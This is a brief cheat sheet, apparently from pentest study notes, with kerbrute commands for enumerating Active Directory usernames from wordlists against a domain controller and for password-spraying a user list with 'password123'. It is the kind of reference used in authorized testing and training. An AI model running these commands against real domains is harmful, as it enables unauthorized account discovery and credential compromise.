# kerbrute
https://github.com/ropnop/kerbrute

## enumerate users using wordlist
```bash
kerbrute userenum --dc $IP -d DOMAIN.local $FILE
kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -dc-ip 10.11.1.20 -domain svcorp.com
```

## password spray users from user list file
```bash
kerbrute passwordspray --dc $IP -d DOMAIN.local users password123
```
